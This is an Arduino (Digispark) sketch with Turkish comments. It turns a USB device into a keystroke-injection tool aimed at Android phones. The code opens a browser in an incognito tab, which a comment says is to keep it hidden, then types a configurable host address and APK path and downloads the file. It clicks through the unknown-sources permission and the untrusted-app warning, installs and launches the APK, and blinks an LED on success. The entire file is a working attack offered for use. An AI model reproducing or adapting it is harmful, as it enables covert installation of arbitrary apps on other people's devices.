#include "DigiKeyboard.h"

// APK İÇİN HOST ADRESİNİ BURAYA GİRİN
#define apkhost "http://127.0.0.1"

// APK ADINI BURAYA YAZIN
#define apkLink "/APKADI.apk"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  // sendKeyStroke() fonksiyonunu 0 ile çağırmak betiği başlatır
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_B, MOD_GUI_LEFT); // super + b -> TARAYICIYI AÇ

  DigiKeyboard.delay(3000); // TARAYICIYI AÇMAK İÇİN 3 SANİYE BEKLE, İSTEĞE BAĞLI ARTTIRILABİLİR

  DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT); // GIZLI OLSUN DIYE GIZLI SEKME ACIYOR

  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyPress(0, MOD_CONTROL_LEFT); // SADE KONTROL

  DigiKeyboard.sendKeyStroke(KEY_L, MOD_CONTROL_LEFT); // KONTROL L

  DigiKeyboard.delay(200);
 
  DigiKeyboard.print(apkhost);

  DigiKeyboard.delay(50);

  DigiKeyboard.println(apkLink); // APK BAGLANTISINI GIRIYOR OTOMATIK OLARAK USTTEKI HOST MEVZUSU ICIN BU

  DigiKeyboard.delay(200);

  DigiKeyboard.println("\t");

  DigiKeyboard.delay(500);

  DigiKeyboard.println("\t\t");

  DigiKeyboard.delay(500);

  DigiKeyboard.println("\t\t\t\t\t\t"); 

  DigiKeyboard.delay(2000);

  DigiKeyboard.print("\t\t\t\t");

  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(0x50); // sol ok

  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // APKYI ACMAK ICIN ENTER OLAYI

  DigiKeyboard.delay(500);

  DigiKeyboard.println("\t\t");

  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(0x51); 

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // BILINMEYEN APKYI YUKLEME IZNI

  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyPress(0,MOD_GUI_LEFT); 
  DigiKeyboard.sendKeyPress(42,MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyPress(0,MOD_GUI_LEFT); 
  DigiKeyboard.sendKeyPress(0); 

  DigiKeyboard.delay(1000); // GERI DONUYO

  for(int i=0; i<= 20; i++){
    DigiKeyboard.sendKeyStroke(0x51); // ASAGI KAYDIRMA
    DigiKeyboard.delay(50);
  }

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x4F); // SAGA KAYDIRMA

  DigiKeyboard.delay(200);
 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // INDRILEN APKYI ACMAK ICIN ENTER OLAYI

  DigiKeyboard.delay(5000);

  DigiKeyboard.sendKeyStroke(0x51); // ASAGI KAYDIRMA OLAYI

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x50); // SOL OK TUSU

  DigiKeyboard.delay(200);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // GUVENILIR OLMAYABILIR OLAYI ICIN

  DigiKeyboard.delay(5000);

  DigiKeyboard.sendKeyStroke(0x51); // ASAGI TUSU BUDA

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x50); // GERI TUSU

  DigiKeyboard.delay(200);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // APKYI INDIRME OLAYI

  DigiKeyboard.delay(5000);

  DigiKeyboard.sendKeyStroke(0x51); // ASAGIDAKI OK TUSU 

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x51);

  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(0x4F); // sağ ok tuşu

  DigiKeyboard.delay(200);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // APKYI BASLATIYOR

  for (;;) {  // RASPERRY PI DE ISIGIN YANIP SONMESINI SAGLIYOR BU ISLEM BASARILI DIYE
    digitalWrite(1, LOW);
    delay(500);
    digitalWrite(1, HIGH);
    delay(500);
  }
}
